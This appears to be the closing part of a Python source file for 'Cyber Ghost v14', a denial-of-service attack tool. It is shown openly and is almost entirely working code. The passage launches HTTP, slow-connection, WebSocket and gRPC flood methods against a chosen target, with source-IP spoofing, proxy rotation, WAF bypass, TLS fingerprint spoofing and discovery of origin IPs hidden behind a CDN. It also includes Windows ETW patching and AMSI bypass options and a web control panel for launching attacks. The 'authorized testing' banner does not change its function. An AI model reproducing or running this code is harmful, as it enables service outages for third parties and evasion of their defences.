                    await self._ws_frame_flood_async(sem)
            elif m == "INFINITY_MIX":
                cycle = itertools.cycle(["HTTP_FLOOD", "SLOWLORIS_V2", "SLOW_READ_V2",
                                          "RUDY_V2", "WEBSOCKET_FRAME_FLOOD",
                                          "GRPC_WEB_TEXT_BOMB"])
                while not self._stop:
                    await self._async_worker(next(cycle), sem)
        except Exception as e:
            logger.debug(f"async worker: {e}")

    def _live_stats(self):
        last_sent = 0; last_time = time.monotonic()
        while not self._stop:
            now = time.monotonic()
            sent, failed, bytes_sent = self.stats_lf.total()
            elapsed = (now - self.start_mono) if self.start_mono else 0
            dt = now - last_time
            rate = (sent - last_sent) / dt if dt > 0 else 0
            last_sent = sent; last_time = now
            mbps = (bytes_sent * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
            scale = resource_gate.get() if self.adaptive else 1.0
            ja3_n = len(self.ja3_seen); ja4_n = len(self.ja4_seen)
            health = self._health_status.get("status", "-") if self._health_status.get("alive") else "DEAD"
            line = (f"\r{C.RED}[🔥]{C.RESET} {C.YELLOW}Sent:{C.RESET} {sent:>14,}  "
                    f"{C.GREEN}Rate:{C.RESET} {rate:>10,.0f}/s  "
                    f"{C.CYAN}BW:{C.RESET} {mbps:>7.1f} Mbps  "
                    f"{C.MAGENTA}Fail:{C.RESET} {failed:>8,}  "
                    f"{C.BLUE}T:{C.RESET} {elapsed:>5.0f}s  "
                    f"{C.DIM}P:{proxy_manager.alive_size()}/{proxy_manager.size()}  "
                    f"JA3:{ja3_n} JA4:{ja4_n}  S:{scale:.2f}  H:{health}{C.RESET}")
            sys.stdout.write(line); sys.stdout.flush()
            time.sleep(0.5)
        sys.stdout.write("\n")

    def launch(self, config: AttackConfig):
        with self._lifecycle_lock:
            if self.running: raise RuntimeError("Already running")
            self.running = True; self._stop = False
        self.target_url = config.target
        if not self.target_url.startswith(("http://", "https://")):
            self.target_url = "http://" + self.target_url
        p = urllib.parse.urlparse(self.target_url)
        self.target_host = p.hostname or config.target
        self.target_port = config.port or (443 if p.scheme == "https" else 80)
        self.method = config.method.upper()
        self.duration = config.duration
        self.use_proxy = config.use_proxy
        self.concurrency = config.concurrency
        self.rate_limit_pps = config.rate_limit_pps
        self.spoof_source = config.spoof_source
        self.waf_bypass = config.waf_bypass
        self.ja3_spoof = config.ja3_spoof
        self.ja4_spoof = config.ja4_spoof
        self.adaptive = config.adaptive
        policy_map = {"random": ProxyManager.ROT_RANDOM, "round_robin": ProxyManager.ROT_RR,
                      "weighted": ProxyManager.ROT_WEIGHTED,
                      "least_latency": ProxyManager.ROT_LEAST_LATENCY,
                      "sticky": ProxyManager.ROT_STICKY}
        self.proxy_policy = policy_map.get(config.proxy_policy, ProxyManager.ROT_WEIGHTED)
        proxy_manager.rotation = self.proxy_policy
        try: self.target_ip = socket.gethostbyname(self.target_host)
        except Exception: self.target_ip = self.target_host
        if config.origin_ip: self.target_ip = config.origin_ip
        self.stats_lf.reset()
        with self.method_lock: self.method_stats.clear()
        self.start_mono = time.monotonic()
        self.ja3_seen.clear(); self.ja4_seen.clear()
        self._init_raw()
        self._start_loop()
        if self.adaptive: resource_gate.start()
        proxy_manager.start_auto_reap()
        if HAS_PSUTIL:
            self.adaptive_controller = AdaptiveController(
                initial_workers=config.concurrency,
                min_workers=max(10, config.concurrency // 20),
                max_workers=max(10000, config.concurrency * 4))
            self.adaptive_controller.start()
            self.net_monitor = NetworkMonitor(interval=5.0)
            self.net_monitor.start()
            self.net_health = NetworkHealthMonitor(interval=3.0)
            self.net_health.start()
        self.adaptive_limiter = AdaptiveRateLimiter(
            base_rate=max(500, config.concurrency // 2),
            burst=max(2000, config.concurrency),
            min_rate=200, max_rate=1000000)
        self._start_health_checker()
        if self.waf_bypass:
            fut = self._submit(self._detect_waf())
            if fut:
                with suppress(Exception): fut.result(timeout=10)
        async_methods = {"HTTP_FLOOD", "SLOWLORIS_V2", "SLOW_READ_V2", "RUDY_V2",
                         "SLOW_HEADERS", "SLOW_BODY", "SLOW_POST",
                         "WEBSOCKET_FRAME_FLOOD", "WEBSOCKET_PING_FLOOD",
                         "WEBSOCKET_DEFLATE_BOMB", "WEBSOCKET_MASK_FLOOD",
                         "WEBSOCKET_ZIP_BOMB", "GRPC_WEB_TEXT_BOMB"}
        thread_methods = set(ALL_METHOD_NAMES) - async_methods - {"INFINITY_MIX"}
        num_threads = max(16, mp.cpu_count() * 12)
        if self.adaptive: num_threads = max(8, int(num_threads * resource_gate.get()))
        self._executor_adaptive.start()
        if self.method in async_methods or self.method == "INFINITY_MIX":
            async def _runner():
                conc = self._executor_adaptive.current_concurrency()
                sem = asyncio.Semaphore(conc)
                tasks = [self._async_worker(self.method, sem) for _ in range(conc)]
                await asyncio.gather(*tasks, return_exceptions=True)
            self._submit(_runner())
        if self.method in thread_methods or self.method == "INFINITY_MIX":
            for _ in range(num_threads):
                self._executor_adaptive.submit(self._run_worker, self.method)
        if self.method == "INFINITY_MIX":
            async def _runner2():
                conc = max(100, self._executor_adaptive.current_concurrency() // 4)
                sem = asyncio.Semaphore(conc)
                await asyncio.gather(*[self._async_worker("HTTP_FLOOD", sem) for _ in range(conc)],
                                     return_exceptions=True)
            self._submit(_runner2())
        def _auto():
            time.sleep(self.duration); self.stop()
        th = threading.Thread(target=_auto, daemon=True, name="auto-stop")
        th.start(); self._auto_threads.append(th)
        th2 = threading.Thread(target=self._live_stats, daemon=True, name="livestats")
        th2.start(); self._auto_threads.append(th2)

    def stop(self):
        with self._lifecycle_lock:
            if not self.running: return
            self.running = False
        self._stop = True
        self._hc_stop.set()
        self._close_raw()
        self._executor_adaptive.stop()
        proxy_manager.stop_auto_reap()
        resource_gate.stop()
        if self.adaptive_controller: self.adaptive_controller.stop()
        if self.net_monitor: self.net_monitor.stop()
        if self.net_health: self.net_health.stop()
        self._stop_loop()

    def status(self):
        sent, failed, bytes_sent = self.stats_lf.total()
        elapsed = (time.monotonic() - self.start_mono) if self.start_mono else 0
        rate = sent / elapsed if elapsed > 0 else 0
        mbps = (bytes_sent * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        eta = max(0, self.duration - elapsed)
        cpu = ram = th = 0
        if HAS_PSUTIL:
            with suppress(Exception):
                cpu = psutil.cpu_percent(interval=None)
                ram = psutil.virtual_memory().percent
                th = psutil.Process().num_threads()
        with self.method_lock: methods_copy = dict(self.method_stats)
        return {"running": self.running, "method": self.method,
                "duration": self.duration, "elapsed": elapsed, "eta": eta,
                "packets_sent": sent, "rate": rate, "failed": failed,
                "bandwidth": mbps, "bytes_sent": bytes_sent,
                "methods_used": methods_copy,
                "cpu_percent": cpu, "ram_percent": ram, "process_threads": th,
                "proxy_count": proxy_manager.size(), "proxy_alive": proxy_manager.alive_size(),
                "proxy_stats": proxy_manager.stats(),
                "concurrency": self.concurrency,
                "waf": waf_detector.waf_name(),
                "waf_confidence": waf_detector.confidence,
                "resource_scale": resource_gate.get() if self.adaptive else 1.0,
                "ja3_count": len(self.ja3_seen), "ja4_count": len(self.ja4_seen),
                "health": self._health_status,
                "net_monitor": self.net_monitor.snapshot() if self.net_monitor else {},
                "adaptive": self.adaptive_controller.snapshot() if self.adaptive_controller else {},
                "rate_limiter": {"current": self.adaptive_limiter.get_rate() if self.adaptive_limiter else 0,
                                 "backoffs": self.adaptive_limiter.backoff_count if self.adaptive_limiter else 0}}

engine = CyberGhost()

# ============================================================================
#  CLI MODES
# ============================================================================
def choose_method_terminal():
    print(f"\n{C.CYAN}{C.BOLD}Available methods ({len(ALL_METHOD_NAMES)}):{C.RESET}")
    cols = 2
    for i, (m, emoji) in enumerate(METHODS, 1):
        end = "\n" if i % cols == 0 else "   "
        print(f"  {C.GREEN}{i:>3}.{C.RESET} {emoji} {m:<38}", end=end)
    if len(METHODS) % cols: print()
    while True:
        v = safe_input(f"\n{C.YELLOW}>> Select (name or #, default=INFINITY_MIX): {C.RESET}")
        if not v: return "INFINITY_MIX"
        if v.isdigit() and 1 <= int(v) <= len(ALL_METHOD_NAMES):
            return ALL_METHOD_NAMES[int(v) - 1]
        if v.upper() in ALL_METHOD_NAMES: return v.upper()

def run_terminal_mode():
    print(f"{C.GREEN}{C.BOLD}═══ TERMINAL ATTACK MODE ═══{C.RESET}\n")
    target = safe_input(f"{C.YELLOW}>> Target (URL/IP): {C.RESET}", "127.0.0.1")
    port = safe_input(f"{C.YELLOW}>> Port (80): {C.RESET}", "80")
    try: port = int(port)
    except Exception: port = 80
    method = choose_method_terminal()
    duration = safe_input(f"{C.YELLOW}>> Duration sec ({DEFAULT_DURATION}): {C.RESET}", str(DEFAULT_DURATION))
    try: duration = max(1, min(int(duration), MAX_DURATION))
    except Exception: duration = DEFAULT_DURATION
    concurrency = safe_input(f"{C.YELLOW}>> Concurrency (2000): {C.RESET}", "2000")
    try: concurrency = max(10, min(int(concurrency), 500000))
    except Exception: concurrency = 2000
    rate = safe_input(f"{C.YELLOW}>> Rate limit pps (0=unlimited): {C.RESET}", "0")
    try: rate = max(0, int(rate))
    except Exception: rate = 0
    spoof = safe_input(f"{C.YELLOW}>> Spoof source IP? (root only) (y/n): {C.RESET}", "n").lower() == "y"
    use_proxy = safe_input(f"{C.YELLOW}>> Use proxy? (y/n): {C.RESET}", "n").lower() == "y"
    if use_proxy:
        pf = safe_input(f"{C.YELLOW}>> Proxy file path (blank=auto-fetch): {C.RESET}", "")
        if pf:
            n = proxy_manager.load_file(pf)
            print(f"{C.GREEN}Loaded {n} proxies. Checking...{C.RESET}")
            a, d = proxy_manager.check_all()
            print(f"{C.GREEN}Alive: {a} | Dead: {d}{C.RESET}")
        else:
            print(f"{C.CYAN}Auto-fetching...{C.RESET}")
            try:
                loop = asyncio.new_event_loop()
                n = loop.run_until_complete(proxy_manager.fetch_from_sources())
                loop.close()
                print(f"{C.GREEN}Fetched: {n}. Checking...{C.RESET}")
                a, d = proxy_manager.check_all()
                print(f"{C.GREEN}Alive: {a} | Dead: {d}{C.RESET}")
            except Exception as e:
                print(f"{C.RED}Fetch failed: {e}{C.RESET}")
    waf = safe_input(f"{C.YELLOW}>> WAF bypass? (y/n): {C.RESET}", "y").lower() == "y"
    adaptive = safe_input(f"{C.YELLOW}>> Adaptive? (y/n): {C.RESET}", "y").lower() == "y"
    auto_origin = safe_input(f"{C.YELLOW}>> Auto-discover origin IP? (y/n): {C.RESET}", "n").lower() == "y"
    origin_ip = ""
    if auto_origin:
        dom = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        print(f"{C.CYAN}🔎 Discovering origin IP for {dom} ...{C.RESET}")
        with suppress(Exception):
            loop = asyncio.new_event_loop()
            res = loop.run_until_complete(OriginIPDiscovery.discover(dom))
            loop.close()
            cands = res.get("candidate_origin_ips", [])
            if cands:
                print(f"{C.GREEN}Candidates:{C.RESET}")
                for i, (ip, srcs) in enumerate(cands[:20], 1):
                    print(f"  {i}. {ip}  [{', '.join(srcs)}]")
                sel = safe_input(f"{C.YELLOW}>> Select # or IP (blank=skip): {C.RESET}", "")
                if sel:
                    if sel.isdigit() and 1 <= int(sel) <= len(cands):
                        origin_ip = cands[int(sel) - 1][0]
                    else: origin_ip = sel
            else:
                print(f"{C.YELLOW}No candidates found.{C.RESET}")
    print(f"\n{C.RED}{C.BOLD}⚠️  Target: {target}:{port} | Method: {method} | Duration: {duration}s{C.RESET}")
    if origin_ip: print(f"{C.MAGENTA}Origin IP override: {origin_ip}{C.RESET}")
    if safe_input(f"{C.YELLOW}>> Type 'I AGREE': {C.RESET}").strip().upper() != "I AGREE":
        print(f"{C.RED}Cancelled.{C.RESET}"); return
    cfg = AttackConfig(target=target, port=port, method=method, duration=duration,
                       bandwidth_limit=0, use_proxy=use_proxy, concurrency=concurrency,
                       rate_limit_pps=rate, spoof_source=spoof,
                       waf_bypass=waf, adaptive=adaptive, origin_ip=origin_ip)
    try:
        engine.launch(cfg)
        while engine.running: time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}Stopping...{C.RESET}"); engine.stop()
    except Exception as e:
        print(f"{C.RED}Error: {e}{C.RESET}"); engine.stop()

def run_origin_mode():
    print(f"{C.GREEN}{C.BOLD}═══ ORIGIN IP DISCOVERY MODE ═══{C.RESET}\n")
    domain = safe_input(f"{C.YELLOW}>> Domain (e.g. example.com): {C.RESET}", "")
    if not domain:
        print(f"{C.RED}Empty domain.{C.RESET}"); return
    print(f"{C.CYAN}🔎 Scanning 25+ sources...{C.RESET}")
    try:
        loop = asyncio.new_event_loop()
        res = loop.run_until_complete(OriginIPDiscovery.discover(domain))
        loop.close()
    except Exception as e:
        print(f"{C.RED}Error: {e}{C.RESET}"); return
    print(f"\n{C.GREEN}{C.BOLD}Domain:{C.RESET} {res['domain']}")
    print(f"{C.GREEN}Domain IPs:{C.RESET} {', '.join(res['domain_ips'])}")
    print(f"{C.GREEN}Subdomains ({len(res['subdomains'])}):{C.RESET}")
    for s in res["subdomains"][:50]: print(f"   • {s}")
    print(f"\n{C.GREEN}{C.BOLD}Candidate Origin IPs ({len(res['candidate_origin_ips'])}):{C.RESET}")
    for ip, srcs in res["candidate_origin_ips"][:100]:
        print(f"   {C.CYAN}•{C.RESET} {ip:18}  {C.DIM}[{', '.join(srcs)}]{C.RESET}")
    out = CACHE_DIR / f"origin_{domain}.json"
    with open(out, "w", encoding="utf-8") as f:
        json.dump(res, f, indent=2, ensure_ascii=False)
    print(f"\n{C.GREEN}Saved to {out}{C.RESET}")

def run_obfuscation_mode():
    print(f"{C.GREEN}{C.BOLD}═══ OBFUSCATION TOOLS (Windows) ═══{C.RESET}\n")
    if not IS_WINDOWS:
        print(f"{C.YELLOW}This mode is Windows-only.{C.RESET}")
        return
    print(f"{C.CYAN}[1] ETW Patch")
    print(f"{C.CYAN}[2] AMSI Bypass")
    print()
    c = safe_input(f"{C.YELLOW}>> Select 1-2: {C.RESET}", "1")
    if c == "1": print("ETW:", "OK" if ETWPatcher.patch() else "FAIL")
    elif c == "2": print("AMSI:", "OK" if AMSIBypass.patch() else "FAIL")

# ============================================================================
#  WEB PANEL
# ============================================================================
if HAS_WEB:
    app = FastAPI(title="Cyber Ghost v14 SUPREME")

    def build_method_options():
        return "".join(f'<option value="{m}">{e} {m}</option>' for m, e in METHODS)

    HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Cyber Ghost v14 SUPREME</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#00ffcc;font-family:monospace;min-height:100vh;display:flex;justify-content:center;padding:20px}
.c{background:rgba(0,20,20,.95);border:2px solid #00ffcc;border-radius:15px;padding:30px;max-width:1100px;width:100%}
h1{font-size:2.4em;text-shadow:0 0 30px #00ffcc;text-align:center;margin-bottom:5px}
.sub,.creator{text-align:center;font-size:.9em;margin-bottom:10px;color:#88ffdd}
.danger{color:#ff4444;font-weight:bold;text-align:center;font-size:.85em;margin:10px 0}
input,select{width:100%;padding:12px;margin:6px 0;background:#001818;border:1px solid #00ffcc66;color:#00ffcc;border-radius:8px;font-size:15px;font-family:inherit}
.flex-row{display:flex;gap:10px}.flex-row>*{flex:1}
.btn-group{display:flex;gap:10px;margin:15px 0}
button{flex:1;padding:14px;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;font-family:inherit}
.btn-start{background:#00cc88;color:#000}.btn-stop{background:#cc4400;color:#fff}.btn-info{background:#0088cc;color:#fff}
.proxy-box{background:#001010;border:1px solid #00ffcc44;border-radius:8px;padding:15px;margin:10px 0}
.proxy-box h3{color:#00ffcc;margin-bottom:10px;font-size:1em}
.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:20px 0}
.stat{background:#001010;padding:12px;border-radius:8px;border-left:3px solid #00ffcc}
.stat-label{font-size:.7em;color:#88ffdd;text-transform:uppercase}
.stat-value{font-size:1.4em;font-weight:bold;margin-top:4px}
.status{font-size:1.2em;margin:15px 0;padding:10px;border-radius:8px;background:#001010;text-align:center}
.feat{text-align:center;color:#88ffdd;font-size:.8em;margin:5px 0}
.log{background:#000;border:1px solid #00ffcc33;border-radius:8px;padding:10px;height:180px;overflow:auto;font-size:.8em;color:#88ffdd;white-space:pre-wrap}
.tag{display:inline-block;padding:3px 8px;border-radius:6px;background:#002a2a;margin:2px;font-size:.75em;color:#88ffdd}
</style></head><body><div class="c">
<h1>CYBER GHOST v14</h1>
<div class="sub">OMNIPOTENT SUPREME</div>
<div class="creator">Cyber Ghost | @Cyber_Ghost_error_404</div>
<div class="danger">FOR AUTHORIZED TESTING ONLY</div>
<div class="feat">Features: <span id="feats">loading...</span></div>
<input id="target" value="http://127.0.0.1" placeholder="Target URL or IP">
<div class="flex-row">
<input id="port" value="80" placeholder="Port">
<select id="method">__METHODS__</select>
</div>
<div class="flex-row">
<input id="duration" value="180" placeholder="Duration (sec)">
<input id="concurrency" value="2000" placeholder="Concurrency">
<input id="rate" value="0" placeholder="Rate pps">
</div>
<div class="flex-row">
<select id="policy">
<option value="weighted">Weighted</option>
<option value="random">Random</option>
<option value="round_robin">Round-Robin</option>
<option value="least_latency">Least-Latency</option>
<option value="sticky">Sticky</option>
</select>
<input id="origin" placeholder="Origin IP override">
</div>
<div class="flex-row">
<label class="tag"><input type="checkbox" id="waf" checked> WAF Bypass</label>
<label class="tag"><input type="checkbox" id="adaptive" checked> Adaptive</label>
<label class="tag"><input type="checkbox" id="spoof"> Spoof SrcIP</label>
<label class="tag"><input type="checkbox" id="ja3" checked> JA3/JA4</label>
</div>
<div class="proxy-box">
<h3>Proxy Management</h3>
<input type="file" id="proxyFile" accept=".txt">
<div id="proxyInfo" style="margin-top:8px;color:#88ffdd;font-size:.85em">No proxies loaded</div>
<div class="flex-row" style="margin-top:8px">
<button class="btn-info" id="fetchProxiesBtn">Auto-Fetch</button>
<button class="btn-info" id="checkProxiesBtn">Check</button>
<button class="btn-info" id="clearProxiesBtn">Clear</button>
</div>
</div>
<div class="proxy-box">
<h3>Origin IP Discovery</h3>
<div class="flex-row">
<input id="originDomain" placeholder="example.com">
<button class="btn-info" id="originBtn" style="flex:0.4">Discover</button>
</div>
<div id="originRes" style="margin-top:8px;color:#88ffdd;font-size:.85em;max-height:200px;overflow:auto"></div>
</div>
<div class="btn-group">
<button class="btn-start" id="startBtn">LAUNCH</button>
<button class="btn-stop" id="stopBtn">STOP</button>
</div>
<div class="status" id="status">IDLE</div>
<div class="stats-grid">
<div class="stat"><div class="stat-label">Packets</div><div class="stat-value" id="packets">0</div></div>
<div class="stat"><div class="stat-label">Rate</div><div class="stat-value" id="rate_val">0</div></div>
<div class="stat"><div class="stat-label">Bandwidth</div><div class="stat-value" id="bandwidth">0</div></div>
<div class="stat"><div class="stat-label">Failed</div><div class="stat-value" id="failed">0</div></div>
<div class="stat"><div class="stat-label">Elapsed</div><div class="stat-value" id="elapsed">0s</div></div>
<div class="stat"><div class="stat-label">Proxies</div><div class="stat-value" id="proxies">0</div></div>
<div class="stat"><div class="stat-label">CPU</div><div class="stat-value" id="cpu">0%</div></div>
<div class="stat"><div class="stat-label">RAM</div><div class="stat-value" id="ram">0%</div></div>
<div class="stat"><div class="stat-label">WAF</div><div class="stat-value" id="waf">-</div></div>
<div class="stat"><div class="stat-label">JA3</div><div class="stat-value" id="ja3">0</div></div>
<div class="stat"><div class="stat-label">JA4</div><div class="stat-value" id="ja4">0</div></div>
<div class="stat"><div class="stat-label">Scale</div><div class="stat-value" id="scale">1.0</div></div>
<div class="stat"><div class="stat-label">Health</div><div class="stat-value" id="health">-</div></div>
<div class="stat"><div class="stat-label">Limiter</div><div class="stat-value" id="limiter">0</div></div>
<div class="stat"><div class="stat-label">Adjust</div><div class="stat-value" id="adjust">0</div></div>
</div>
<div class="log" id="log"></div>
</div>
<script>
function log(m){const l=document.getElementById('log');l.textContent+=m+'\\n';l.scrollTop=l.scrollHeight;}
fetch('/api/features').then(r=>r.json()).then(j=>{document.getElementById('feats').textContent=j.features.join(' | ');});
document.getElementById('proxyFile').onchange = async ()=>{
  const f=document.getElementById('proxyFile').files[0]; if(!f)return;
  const fd=new FormData(); fd.append('file',f);
  const r=await fetch('/api/proxy/upload',{method:'POST',body:fd});
  const j=await r.json();
  document.getElementById('proxyInfo').innerHTML='Loaded <b>'+j.count+'</b>';
};
document.getElementById('fetchProxiesBtn').onclick = async ()=>{
  document.getElementById('proxyInfo').innerHTML='Fetching...';
  const r=await fetch('/api/proxy/fetch',{method:'POST'});
  const j=await r.json();
  document.getElementById('proxyInfo').innerHTML='Fetched <b>'+j.count+'</b>';
};
document.getElementById('checkProxiesBtn').onclick = async ()=>{
  document.getElementById('proxyInfo').innerHTML='Checking...';
  const r=await fetch('/api/proxy/check',{method:'POST'});
  const j=await r.json();
  document.getElementById('proxyInfo').innerHTML='Alive: <b>'+j.alive+'</b> / Dead: '+j.dead;
};
document.getElementById('clearProxiesBtn').onclick = async ()=>{
  await fetch('/api/proxy/clear',{method:'POST'});
  document.getElementById('proxyInfo').innerHTML='Cleared';
};
document.getElementById('originBtn').onclick = async ()=>{
  const d=document.getElementById('originDomain').value.trim(); if(!d)return;
  document.getElementById('originRes').innerHTML='Scanning...';
  const r=await fetch('/api/origin/discover',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:d})});
  const j=await r.json();
  let html='<b>Domain IPs:</b> '+(j.domain_ips||[]).join(', ')+'<br>';
  html+='<b>Subdomains:</b> '+(j.subdomains||[]).length+'<br><b>Candidates:</b><br>';
  (j.candidate_origin_ips||[]).slice(0,30).forEach(x=>{
    html+='• '+x[0]+' <span style="color:#448888">['+x[1].join(',')+']</span><br>';
  });
  document.getElementById('originRes').innerHTML=html;
};
document.getElementById('startBtn').onclick = async ()=>{
  const cfg={
    target: document.getElementById('target').value,
    port: parseInt(document.getElementById('port').value)||80,
    method: document.getElementById('method').value,
    duration: parseInt(document.getElementById('duration').value)||180,
    concurrency: parseInt(document.getElementById('concurrency').value)||2000,
    rate_limit_pps: parseInt(document.getElementById('rate').value)||0,
    proxy_policy: document.getElementById('policy').value,
    origin_ip: document.getElementById('origin').value,
    use_proxy: true, lang:'en',
    waf_bypass: document.getElementById('waf').checked,
    adaptive: document.getElementById('adaptive').checked,
    spoof_source: document.getElementById('spoof').checked,
    ja3_spoof: document.getElementById('ja3').checked,
    ja4_spoof: document.getElementById('ja3').checked
  };
  const r=await fetch('/api/attack/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(cfg)});
  if(r.ok){log('launched');alert('LAUNCHED');}
  else{const e=await r.json(); alert('Error: '+(e.detail||'unknown'));}
};
document.getElementById('stopBtn').onclick = async ()=>{await fetch('/api/attack/stop',{method:'POST'});log('stopped');alert('Stopped');};
const wsP=location.protocol==='https:'?'wss://':'ws://';
const ws=new WebSocket(wsP+location.host+'/ws/stats');
ws.onmessage = e=>{
  const d=JSON.parse(e.data);
  if(d.type==='stats'){const s=d.data;
    document.getElementById('packets').textContent=(s.packets_sent||0).toLocaleString();
    document.getElementById('rate_val').textContent=Math.round(s.rate||0);
    document.getElementById('bandwidth').textContent=(s.bandwidth||0).toFixed(1)+' Mbps';
    document.getElementById('failed').textContent=(s.failed||0).toLocaleString();
    document.getElementById('elapsed').textContent=Math.round(s.elapsed||0)+'s';
    document.getElementById('proxies').textContent=(s.proxy_alive||0)+'/'+(s.proxy_count||0);
    document.getElementById('cpu').textContent=(s.cpu_percent||0).toFixed(0)+'%';
    document.getElementById('ram').textContent=(s.ram_percent||0).toFixed(0)+'%';
    document.getElementById('waf').textContent=s.waf||'-';
    document.getElementById('ja3').textContent=s.ja3_count||0;
    document.getElementById('ja4').textContent=s.ja4_count||0;
    document.getElementById('scale').textContent=(s.resource_scale||1).toFixed(2);
    document.getElementById('health').textContent=(s.health&&s.health.status)||'-';
    document.getElementById('limiter').textContent=(s.rate_limiter&&s.rate_limiter.current)||0;
    document.getElementById('adjust').textContent=(s.adaptive&&s.adaptive.adjustments)||0;
    document.getElementById('status').innerHTML='ATTACKING';
  }else{document.getElementById('status').innerHTML='IDLE';}
};
</script></body></html>"""
    HTML = HTML.replace("__METHODS__", build_method_options())

    @app.get("/", response_class=HTMLResponse)
    async def index(): return HTMLResponse(HTML)

    @app.get("/api/features")
    async def features():
        feats = []
        if HAS_UVLOOP: feats.append("uvloop")
        if HAS_H2: feats.append("hyper-h2")
        if HAS_AIOQUIC: feats.append("aioquic")
        if HAS_AIO_SOCKS: feats.append("aiohttp-socks")
        if HAS_PYSOCKS: feats.append("pysocks")
        if HAS_SCAPY: feats.append("scapy")
        if HAS_DNSPY: feats.append("dnspython")
        if HAS_CURL_CFFI: feats.append("curl_cffi")
        if HAS_BROTLI: feats.append("brotli")
        if HAS_BROWSERFORGE: feats.append("browserforge")
        if HAS_MMH3: feats.append("mmh3")
        if HAS_LIBC and IS_LINUX: feats.append("sendmmsg")
        feats.extend(["waf-bypass", "origin-25+", "ja3-ja4", "adaptive", "cve-exploiter",
                      "obfuscation", "sni-spoof", "http3-close-flood", "sctp-init",
                      "tcp-fastopen", "doh-spoof", "ech-flood", "ws-zip-bomb"])
        return {"features": feats}

    @app.post("/api/attack/start")
    async def start_attack(config: AttackConfig, background_tasks: BackgroundTasks):
        if engine.running: raise HTTPException(status_code=400, detail="Already running")
        background_tasks.add_task(engine.launch, config)
        return {"message": "started"}

    @app.post("/api/attack/stop")
    async def stop_attack():
        engine.stop()
        return {"message": "stopped"}

    @app.post("/api/proxy/upload")
    async def upload_proxy(file: UploadFile = File(...)):
        try:
            content = await file.read()
            proxy_manager.clear()
            count = proxy_manager.load_list(content.decode("utf-8", errors="ignore").splitlines())
            return {"count": count}
        except Exception as e:
            return {"error": str(e)}

    @app.post("/api/proxy/fetch")
    async def fetch_proxies_endpoint():
        count = await proxy_manager.fetch_from_sources()
        return {"count": count}

    @app.post("/api/proxy/check")
    async def check_proxies():
        alive, dead = proxy_manager.check_all()
        return {"alive": alive, "dead": dead}

    @app.post("/api/proxy/clear")
    async def clear_proxies():
        proxy_manager.clear()
        return {"ok": True}

    @app.get("/api/attack/status")
    async def attack_status():
        if engine.running: return engine.status()
        return {"running": False}

    @app.post("/api/origin/discover")
    async def origin_discover(payload: dict):
        dom = (payload or {}).get("domain", "").strip()
        if not dom: raise HTTPException(status_code=400, detail="domain required")
        try:
            return await OriginIPDiscovery.discover(dom)
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))

    @app.websocket("/ws/stats")
    async def websocket_stats(ws: WebSocket):
        await ws.accept()
        try:
            while True:
                if engine.running:
                    await ws.send_json({"type": "stats", "data": engine.status()})
                else:
                    await ws.send_json({"type": "idle"})
                await asyncio.sleep(0.5)
        except WebSocketDisconnect: pass
        except Exception: pass

def run_web_mode():
    if not HAS_WEB:
        print(f"{C.RED}FastAPI/uvicorn not installed.{C.RESET}"); return
    local_ip = get_local_ip()
    print(f"{C.GREEN}{C.BOLD}═══ WEB PANEL MODE ═══{C.RESET}\n")
    print(f"{C.CYAN}🌐 http://127.0.0.1:8000{C.RESET}")
    print(f"{C.CYAN}🌐 http://{local_ip}:8000{C.RESET}\n")
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")

# ============================================================================
#  MAIN
# ============================================================================
def main():
    print_banner()
    tune_system()
    ack = safe_input(f"{C.RED}>> Type 'I AGREE' to accept: {C.RESET}")
    if ack.strip().upper() != "I AGREE":
        print(f"{C.RED}Exiting.{C.RESET}"); sys.exit(0)
    mode = print_mode_menu()
    if mode == "1": run_terminal_mode()
    elif mode == "2": run_web_mode()
    elif mode == "3": run_origin_mode()
    elif mode == "4": run_obfuscation_mode()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{C.YELLOW}Interrupted.{C.RESET}")
    except Exception as e:
        print(f"{C.RED}Fatal: {e}{C.RESET}")
        traceback.print_exc()
        sys.exit(1)
